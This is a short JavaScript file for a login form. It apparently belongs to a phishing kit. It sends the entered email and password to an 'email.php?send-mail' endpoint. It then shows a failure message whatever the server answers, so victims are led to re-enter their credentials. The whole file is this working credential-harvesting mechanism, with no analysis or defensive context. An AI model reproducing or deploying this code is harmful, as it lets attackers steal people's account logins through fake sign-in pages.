var btnLogin = document.getElementById("login");

var email = document.getElementById("email");
var password = document.getElementById("password");
var error = document.getElementById("error");

btnLogin.addEventListener('click', function(e){
	console.log('g');
	e.preventDefault();
	if(email.value === ""){
		error.textContent = "You entered an incorrect username or password.";
		error.className = error.className.replace(/\bhide\b/g, "show");
		email.focus();
		return false;
	}else if(password.value === ""){
		error.textContent = "You entered an incorrect username or password.";
		error.className = error.className.replace(/\bhide\b/g, "show");
		password.focus();
		return false;
	} else {
		error.textContent = "Signing In...";
		error.className = error.className.replace(/\bhide\b/g, "show");
		error.className = error.className.replace(/\balert-danger\b/g, "alert-info");

		var xmlhttp;
	    if(window.XMLHttpRequest){
	      xmlhttp = new XMLHttpRequest();
	    }else{
	      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	    }

	    xmlhttp.onreadystatechange=function(){
	      if(xmlhttp.readyState==4 && xmlhttp.status==200){
	      	console.log(xmlhttp.responseText);
	      	var res = xmlhttp.responseText.replace(/\s+/g, "");
	      	if(xmlhttp.responseText === 'true'){
	      		error.textContent = "Something went wrong!";
	      		error.className = error.className.replace(/\balert-info\b/g, "alert-danger");
	      	}else {
	      		error.textContent = "Please try again";
	      		error.className = error.className.replace(/\balert-info\b/g, "alert-danger");
	      	}
	      }
	    }

    	var formdata = new FormData();

    	formdata.append("email", email.value);
    	formdata.append("password", password.value);

	    var url = 'email.php?send-mail';
	    
	    xmlhttp.open("POST", url);
	    xmlhttp.send(formdata);

	    return true;
	}
})